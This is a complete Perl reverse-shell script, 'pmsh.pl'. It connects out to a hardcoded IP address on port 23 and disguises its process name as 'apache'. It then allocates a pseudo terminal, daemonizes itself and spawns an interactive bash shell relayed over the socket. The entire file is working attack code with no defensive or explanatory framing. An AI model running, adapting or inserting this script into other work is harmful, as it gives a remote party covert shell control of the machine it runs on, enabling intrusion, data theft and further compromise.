#!/usr/bin/perl -w

use IO::Socket;
use Fcntl;

# IOCTLs
$TIOCGPTN = -2147199952;
$TIOCSPTLCK = 1074025521;
$EAGAIN=11;

print "pmsh.pl v0.1 (c) 2006 Michael Schierl <schierlm-public AT gmx DOT de>\n";

$HOST="72.167.37.182";
$PORT="23";

$0="apache";

print "Connecting to $HOST:$PORT... ";

$sock = new IO::Socket::INET (
	PeerAddr => $HOST,
	PeerPort => $PORT,
	Proto => 'tcp',
	Blocking => 0,
) or die $!;

print "ok\nAllocatig pseudo terminal... ";

## ptsname
sysopen (PTMX, '/dev/ptmx', O_RDWR|O_NONBLOCK) or die $!;
$tmp='';
ioctl (PTMX, $TIOCGPTN, $tmp) or die $!;
$pts = unpack('i', $tmp);

print "/dev/pts/$pts\nInitializing pseudo terminal... ";

## grantpt not needed on devpts

## unlockpt
$unlock=pack('i', 0);
ioctl(PTMX, $TIOCSPTLCK, $unlock) or die $!;

## prepare daemonizing
chdir '/' or die $!;
open STDIN, '/dev/null' or die $!;
umask 0;

print "ok\nForking shell thread...";

defined($pid = fork) or die $!;
exit if $pid;
defined($pid = fork) or die $!;
if (!$pid) {
	exec("/sbin/getty -n -l /bin/bash 38400 /dev/pts/$pts") or
	exec("/bin/bash </dev/pts/$pts >/dev/pts/$pts 2>/dev/pts/$pts") or
	die $!;
	exit;
}        

print "ok\nHave fun!\n";

open STDOUT, '>>/dev/null' or die $!;
open STDERR, '>>/dev/null' or die $!;

$pp = PTMX;
$rin=$win=$ein='';
vec($rin,fileno($pp),1) =1;
vec($rin,fileno($sock),1) = 1;

select $sock;
$|=1;
select PTMX;
$|=1;
select STDOUT;
$|=1;
$finished=0;

sub forwarddata {
	my ($from,$to) = @_;
	while(1) {
		$rv = sysread($from, $buff, 1024);
		last if (!defined($rv) && $! == $EAGAIN);	
		defined($rv) or die $!;
		if ($rv == 0) { $finished = 1; last;}
		while(length $buff > 0) {
			$rv = syswrite($to, $buff, length $buff);
			if (!defined($rv) && $! == $EAGAIN) {
				## try again
				next;
			}
			defined($rv) or die $!;
			last if ($rv == length $buff);
			substr($buff,0,$rv) = '';
		}
	}
}

while(! $finished) {
	$nfound = select($rout=$rin, $wout=$win, $eout=$ein, undef);
	die $! if ($nfound == -1);
	forwarddata($pp,$sock);
	last if $finished;
	forwarddata($sock,$pp);
	last if $finished;
}
close PTMX;
close $sock;